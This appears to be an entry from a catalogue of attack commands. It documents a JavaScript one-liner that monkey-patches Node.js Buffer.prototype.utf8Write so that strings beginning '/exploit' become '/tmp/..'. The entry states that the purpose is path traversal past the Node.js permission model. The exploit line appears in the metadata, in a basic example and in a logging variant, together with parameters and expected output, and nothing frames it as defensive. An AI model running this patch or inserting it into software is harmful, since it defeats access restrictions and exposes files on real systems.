---
id: cmd-buffer-patch
type: command
executor: javascript
data: >-
  Buffer.prototype.utf8Write = ((w) => function (str, ...args) { return
  w.apply(this, [str.replace(/^\/exploit/, '/tmp/..'), ...args]);
  })(Buffer.prototype.utf8Write);
output: '[Function (anonymous)]'
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.219Z'
platforms:
  - Node.js
tags:
  - monkey-patch
  - buffer
verified: false
validated: true
submitted: true
---

# buffer-utf8write-monkeypatch

## Command

```javascript
Buffer.prototype.utf8Write = ((w) => function (str, ...args) { return w.apply(this, [str.replace(/^\/exploit/, '/tmp/..'), ...args]); })(Buffer.prototype.utf8Write);
```

## Description

Monkey-patches Buffer.prototype.utf8Write to replace '/exploit' prefixes with '/tmp/..' in strings during Buffer.from() operations, enabling path traversal in the permission model.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `str.replace(/^\/exploit/, '/tmp/..')` | Replaces leading '/exploit' with traversal sequence | Yes |
| `w.apply(this, [...])` | Applies original method to modified args | Yes |

## Examples

### Basic Usage

```javascript
Buffer.prototype.utf8Write = ((w) => function (str, ...args) { return w.apply(this, [str.replace(/^\/exploit/, '/tmp/..'), ...args]); })(Buffer.prototype.utf8Write);
```

### Advanced Usage

```javascript
// Similar but with additional logging
Buffer.prototype.utf8Write = ((w) => function (str, ...args) { console.log('Patched:', str); return w.apply(this, [str.replace(/^\/exploit/, '/tmp/..'), ...args]); })(Buffer.prototype.utf8Write);
```

## Expected Output

Returns the new function, confirming the patch is applied.

## Related

- [[Related Procedure: Monkey-Patch-Buffer-utf8Write]]
